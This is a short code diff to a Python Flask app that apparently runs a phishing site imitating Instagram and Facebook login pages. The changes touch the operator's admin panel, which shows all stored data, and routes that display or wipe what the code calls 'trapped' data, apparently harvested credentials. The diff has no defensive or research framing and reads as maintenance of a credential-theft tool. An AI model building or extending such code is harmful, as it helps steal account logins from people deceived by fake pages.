@@ -131,7 +131,7 @@ def loginInsta():
 @app.route("/admin")
 def admin():
      if 'user' in session and session['user']==Suser:
-        return render_template("admin.html",isLogged=True,uid=Suser)
+        return render_template("ADMIN.html",allData=dbh,isLogged=True,uid=Suser)
      return render_template("login.html",isLogged=False)
 
 
@@ -147,17 +147,10 @@ def insta():
 def facebook():
     return render_template("/facebook/facebook.html")
 
-#for admin
-@app.route("/showUser")
-def showUser():
-    dbh.showUserData()
-    dbh.showTrapedData()
-    return "show User"
 
 
 #for admin
 @app.route("/delete")
 def deleteDATABASE():
-    dbh.showTrapedData()
-    dbh.deleteTrapedData()
+    dbh.deleteAll()
     return "deleted"
